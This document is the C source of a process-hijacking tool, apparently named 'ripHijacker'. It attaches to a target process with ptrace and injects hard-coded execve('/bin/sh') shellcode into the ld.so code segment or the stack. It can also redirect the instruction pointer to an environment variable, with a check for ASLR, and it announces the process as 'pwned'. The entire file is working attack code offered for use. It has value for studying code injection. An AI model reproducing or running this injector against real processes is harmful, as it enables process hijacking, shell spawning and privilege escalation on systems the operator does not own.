#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <signal.h>
#include <sys/types.h>
#include <errno.h>
#include <string.h>
#include <sys/user.h>

char shellcode[] __attribute__((section(".myshellcode,\"awx\",@progbits#"))) = 	"\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48"
										"\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0"
										"\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"; 

void print()
{
	printf("\n      _       _    _ _ _            _             \n");
	printf("     (_)     | |  | (_|_)          | |            \n");
	printf(" _ __ _ _ __ | |__| |_ _  __ _  ___| | _____ _ __ \n");
	printf("| '__| | '_ \\|  __  | | |/ _` |/ __| |/ / _ \\ '__|\n");
	printf("| |  | | |_) | |  | | | | (_| | (__|   <  __/ |   \n");
	printf("|_|  |_| .__/|_|  |_|_| |\\__,_|\\___|_|\\_\\___|_|   \n");
	printf("       | |           _/ |                         \n");
	printf("       |_| ~metantz~|__/                          \n\n");
}

void success(pid_t pid, struct user_regs_struct registers)
{
	printf(" Done.\n\n");
	
	ptrace(PTRACE_GETREGS, pid, NULL, &registers);
	
	printf(" Content of $rip: 0x%.16llx\n", registers.rip);
    	printf(" Content of addr pointed by $rip: 0x%.16lx\n\n", ptrace(PTRACE_PEEKTEXT, pid, registers.rip, NULL));
	printf("******* Process[%d] pwned! *******\n\n", pid);
}


void ld_inj(pid_t pid, struct user_regs_struct registers)
{
	char buff[1024];
	char path[32];
	char *wanted;
	FILE *my_map;
	int size, i, check = 0;

	sprintf(path, "/proc/%d/maps", pid);
	my_map = fopen(path, "r");
	wanted = malloc(sizeof(unsigned long long int)*2);
	memset(wanted,0x0, sizeof(unsigned long long int)*2);

	while(fgets(buff,sizeof(buff), my_map) != NULL)
	{	
		if(strstr(buff, "r-xp") && strstr(buff, "/lib/x86_64-linux-gnu/ld-2.19.so"))
		{
			check = 1;
			break;
		}
	}
	if(!check)
	{
		printf("Unable to find ld-2.19.so address.\nExit..");
		exit(1);
	}
	printf("######### FOUND EXECUTABLE ZONE ##########\n\n");
	printf(" %s\n", buff);
		
	memcpy(wanted, buff, 12);
	size = sizeof(shellcode);
		
	printf(" Injecting Shellcode into tracee's executable segment..\n");		

	for(i=0; i<size;i++)
	{
		ptrace(PTRACE_POKETEXT, pid, (unsigned long long int) strtoull(wanted, NULL, 16)+i, *(shellcode+i));
	}
		
	printf(" Done.\n");
	printf(" Overwriting tracee's $rip..\n");
        
    	registers.rip = (unsigned long long int) strtoull(wanted, NULL, 16) + 2;
    	ptrace(PTRACE_SETREGS, pid, NULL, &registers);

    	success(pid, registers);

    
}

void stack_inj(pid_t pid, struct user_regs_struct registers)
{
	int i, size = sizeof(shellcode);
	
	printf(" Injecting Shellcode into tracee's stack..\n");		

	for(i=0; i<size;i++)
	{
		ptrace(PTRACE_POKETEXT, pid, registers.rsp+i, *(shellcode+i));
	}
		
	printf(" Done.\n");
	printf(" Overwriting tracee's $rip with $rsp..\n\n");
        
    	registers.rip = registers.rsp + 2;
    	ptrace(PTRACE_SETREGS, pid, NULL, &registers);

    	success(pid, registers);
}

void rip_to_env(pid_t pid, char* argv0, struct user_regs_struct registers, char * envVar, char * name)
{
	
	int i, check = 0, size = sizeof(unsigned long long int) * 2;
	unsigned long long int wanted, pointed, current_value, *chunk = malloc(size);
	char *envAddr = getenv(envVar);
	if(envAddr == NULL)
	
	{
		printf(" Variable %s not found!\n", envVar);
		exit(1);
	}

	memset(chunk, 0x0, size);
	memcpy(chunk, envAddr, size); 
	envAddr += (strlen(argv0) - strlen(name))*2;

	printf("\n~~~~~~ If ASLR is disabled, variable %s will be at %p ~~~~~~~\n", envVar, envAddr);
		
	pointed = ptrace(PTRACE_PEEKTEXT, pid, envAddr, NULL);

	if(pointed == (unsigned long long int) *chunk)
	{
		printf("\n ASLR is diasbled.\n");
		printf("\n Overwriting tracee's $rip with %s's address..\n", envVar);
	
		registers.rip = (unsigned long long int) envAddr;
		ptrace(PTRACE_SETREGS, pid, NULL, &registers);

		success(pid, registers);
	}
	else
	{
		printf("\n ASLR is enabled.\n");
		printf(" Searching %s's address...\n", envVar);

		for(i=0; i<1024; i++)
		{
			current_value = ptrace(PTRACE_PEEKTEXT, pid, registers.rsp+(i*0x08), NULL);
				
			if( current_value == *chunk)
			{
				wanted = registers.rsp+(i*0x08);
				check = 1;
			}
		}

		free(chunk);

		if(check)
		{
			printf(" %s's address is 0x%.16llx\n", envVar, wanted);
			printf("\n Overwriting tracee's $rip with %s's address..\n", envVar);
			
			registers.rip = wanted;
			ptrace(PTRACE_SETREGS, pid, NULL, &registers);
			
			success(pid, registers);
      	}
      	else
		{
			printf(" %s's address not found.\n", envVar);
			printf(" If %s will restart we may retry to find %s address!\nDo you want to try to kill [%d] process? (Y/N)\n", name, envVar, pid);
			if(getchar() == 'Y')
			{
				if(kill(pid, SIGKILL) == -1)
				{
					printf(" Error: %s\nBye!\n", strerror(errno));
					exit(1);
				}
				else
				{
					printf(" Killed.\nBye!\n");
					exit(0);
				}
			}
			else
			{
					printf(" Do you want to try another attack?\n");
					printf(" [1] ld_inj\n [2] stack_inj\n [else] exit\n");
					getchar();
					char p = getchar();
					switch(p)
					{
						case '1': ld_inj(pid, registers);
								  break;
						case '2': stack_inj(pid, registers);
								  break;
						default: printf("\nBye\n");
								 exit(0);
								 break;
					}
					
					
			}
		}
	}	

}

int main(int argc, char **argv)
{
	int c, options[] = {0,0,0} ;
	pid_t pid = 0;
	char *envVar, *name;
	struct user_regs_struct registers;

	

	void usage()
	{
		print();
		printf(" Usage: %s -p <target_pid>  [-z [-e <environment_variable> -n <target_program_name>]]\n", argv[0]);
		exit(0);
	}

	void check_opt(pid_t pid, int options[])
	{
		if(!pid || options[1] != options[2] || (!options[0] && (options[1] || options[2])))
		{
			usage();
		}
	}

	while ((c = getopt(argc, argv, "p:z:e:n:")) != -1)
	{
		switch(c) 
   		{
    			case 'p':
        			pid = atoi(optarg);
        			break;
        		case 'z':
	        		options[0] = atoi(optarg);
       				break;
    			case 'e':
	    			options[1] = 1;
        			envVar = strdup(optarg);
        			break;
    			case 'n':
        			name = strdup(optarg);
        			options[2] = 1;
        			break;
       			default:
				usage();
    				break;
    		}	
	}

	check_opt(pid, options);

	print();
	printf("\n Attaching to process %d..\n", pid);
	
	if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
	{
		printf(" Error: %s\n", strerror(errno));
		exit(1);
	}

	wait(NULL);
		
	printf(" Process %d succesfully attached!!\n", pid);
	printf(" Reading tracee's registers..\n");		
		
	ptrace(PTRACE_GETREGS, pid, NULL, &registers);
		
	printf(" Done.\n");
	printf("\n Press [Enter] to continue..\n\n");
	getchar();

	if(!options[0])
	{
		ld_inj(pid, registers);
	}
	else if(options[0] && !(options[1] && options[2]))
	{
		stack_inj(pid, registers);
	}
	else if(options[0] && options[1] && options[2])
	{
		rip_to_env(pid, argv[0], registers, envVar, name);
	}
	else
	{
		printf(" Unkown error.\n");
		exit(1);
	}
	
	exit(0);
}

